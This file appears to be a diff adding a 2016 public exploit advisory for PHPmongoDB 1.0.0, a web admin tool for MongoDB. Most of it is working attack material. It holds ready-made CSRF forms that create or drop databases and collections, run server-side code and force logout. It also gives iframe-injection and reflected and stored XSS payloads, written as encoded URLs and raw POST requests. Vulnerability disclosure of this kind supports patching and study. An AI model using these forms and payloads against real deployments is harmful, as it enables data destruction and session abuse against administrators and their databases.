@@ -1,0 +1,283 @@
+#################################################################################################################################################
+# Exploit Title: PHPmongoDB v1.0.0 - Multiple Vulnerabilities [CSRF |
+HTML(or Iframe) Injection | XSS (Reflected & Stored)]
+# Date: 14.04.2016
+# Exploit Author: Ozer Goker
+# Vendor Homepage: http://www.phpmongodb.org
+# Software Link: https://github.com/phpmongodb/phpmongodb
+# Version: 1.0.0
+#################################################################################################################################################
+
+Introduction
+A Tool available for administrative work of MongoDB over Web. It is
+PHPmongoDB. source = http://www.phpmongodb.org
+
+Vulnerabilities: CSRF | HTML(or Iframe) Injection | XSS (Reflected & Stored)
+
+
+CSRF details:
+
+#################################################################################################################################################
+
+CSRF1
+
+Create Database
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php" method="POST">
+<input type="text" name="db" value="db"/>
+<input type="text" name="load" value="Database/Save"/>
+<input type="submit" value="Create DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################################################################################
+
+CSRF2
+
+Drop Database
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php" method="POST">
+<input type="text" name="db" value="db"/>
+<input type="text" name="load" value="Database/Drop"/>
+<input type="submit" value="Drop DB"/>
+</form>
+</body>
+</html>
+
+#################################################################################################################################################
+
+CSRF3
+
+Create Collection
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php" method="POST">
+<input type="text" name="collection" value="testcollection"/>
+<input type="text" name="load" value="Collection/CreateCollection"/>
+<input type="text" name="db" value="db"/>
+<input type="submit" value="Create Collection"/>
+</form>
+</body>
+</html>
+
+
+#################################################################################################################################################
+
+Drop Collection
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php" method="POST">
+<input type="text" name="collection" value="testcollection"/>
+<input type="text" name="load" value="Collection/DropCollection"/>
+<input type="text" name="db" value="db"/>
+<input type="submit" value=Drop Collection"/>
+</form>
+</body>
+</html>
+
+#################################################################################################################################################
+
+Execute Code
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php?load=Server/Execute"
+method="POST">
+<input type="text" name="code" value="db.getCollectionNames()"/>
+<input type="text" name="db" value="db"/>
+<input type="submit" value=Execute Code"/>
+</form>
+</body>
+</html>
+
+#################################################################################################################################################
+
+Logout
+
+<html>
+<body>
+<form action="http://localhost/phpmongodb/index.php?load=Login/Logout"
+method="POST">
+<input type="submit" value="Logout"/>
+</form>
+</body>
+</html>
+
+#################################################################################################################################################
+
+
+HTML Injection details:
+#################################################################################################################################################
+
+HTML Injection1
+
+URL
+http://localhost/phpmongodb/index.php/%22%3E%3Ciframe%20src=http://www.phpmongodb.org%3E
+
+METHOD
+Get
+
+PARAMETER
+URL
+
+PAYLOAD
+/"><iframe src=http://www.phpmongodb.org>
+
+#################################################################################################################################################
+
+HTML Injection2
+
+URL
+http://localhost/phpmongodb/index.php?size=&load=Collection%2fCreateCollection&max=&capped=on&collection=system.indexes%253E%253Ciframe%2520src%253Dhttp%253A%252f%252fwww.phpmongodb.org%253E&db=local
+
+METHOD
+Get
+
+PARAMETER
+collection
+
+PAYLOAD
+%253E%253Ciframe%2520src%253Dhttp%253A%252f%252fwww.phpmongodb.org%253E
+
+#################################################################################################################################################
+
+HTML Injection3
+
+URL
+http://localhost/phpmongodb/index.php?size=&load=Collection%2fCreateCollection&max=&capped=on&collection=system.indexes&db=local%253E%253Ciframe%2520src%253Dhttp%253A%252f%252fwww.phpmongodb.org%253E
+
+METHOD
+Get
+
+PARAMETER
+db
+
+PAYLOAD
+%253E%253Ciframe%2520src%253Dhttp%253A%252f%252fwww.phpmongodb.org%253E
+
+#################################################################################################################################################
+
+HTML Injection4 (Stored)
+
+URL
+http://localhost/phpmongodb/index.php
+
+METHOD
+Post
+
+PARAMETER
+collection
+
+PAYLOAD
+%253E%253Ciframe%2520src%253Dhttp%253A%252f%252fwww.phpmongodb.org%253E
+
+Request
+POST /phpmongodb/index.php HTTP/1.1
+
+collection=testcollection%253E%253Ciframe%2520src%253Dhttp%253A%252f%
+252fwww.phpmongodb.org
+%253E&size=&max=&load=Collection%2FCreateCollection&db=db&save=
+
+#################################################################################################################################################
+
+
+
+XSS details:
+#################################################################################################################################################
+
+XSS1 (Reflected)
+
+URL
+http://localhost/phpmongodb/index.php/%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+METHOD
+Get
+
+PARAMETER
+URL
+
+PAYLOAD
+/"><script>alert(1)</script>
+
+#################################################################################################################################################
+
+XSS2 (Reflected)
+
+URL
+http://localhost/phpmongodb/index.php?size=&load=Collection%2fCreateCollection&max=&capped=on&collection=system.indexes%253cscript%253ealert%25282%2529%253c%252fscript%253e&db=local
+
+METHOD
+Get
+
+PARAMETER
+collection
+
+PAYLOAD
+%253cscript%253ealert%25282%2529%253c%252fscript%253e
+
+#################################################################################################################################################
+
+XSS3 (Reflected)
+
+URL
+http://localhost/phpmongodb/index.php?size=&load=Collection%2fCreateCollection&max=&capped=on&collection=system.indexes&db=local%253cscript%253ealert%25283%2529%253c%252fscript%253e
+
+METHOD
+Get
+
+PARAMETER
+db
+
+PAYLOAD
+%253cscript%253ealert%25283%2529%253c%252fscript%253e
+
+#################################################################################################################################################
+
+XSS4 (stored)
+
+URL
+http://localhost/phpmongodb/index.php
+
+METHOD
+Post
+
+PARAMETER
+collection
+
+PAYLOAD
+%253Cscript%253Ealert%25284%2529%253C%252fscript%253E
+
+Request
+POST /phpmongodb/index.php HTTP/1.1
+
+collection=testcollection%253Cscript%253Ealert%25284%2529%253C%252fscript%253E&size=&max&load=Collection%2FCreateCollection&db=db&save=
+
+
+#################################################################################################################################################
+
+XSS5 (Stored)
+http://localhost/phpmongodb/index.php?load=Server/Execute
+
+METHOD
+Post
+
+PATAMETER
+db
+
+PAYLOAD
+%253Cscript%253Ealert%25285%2529%253C%252fscript%253E
+
+
+Request
+POST /phpmongodb/index.php?load=Server/Execute HTTP/1.1
+
+code=db.getCollectionNames%28%29&db=db%253Cscript%253Ealert%25285%2529%253C%252fscript%253E
+
+#################################################################################################################################################
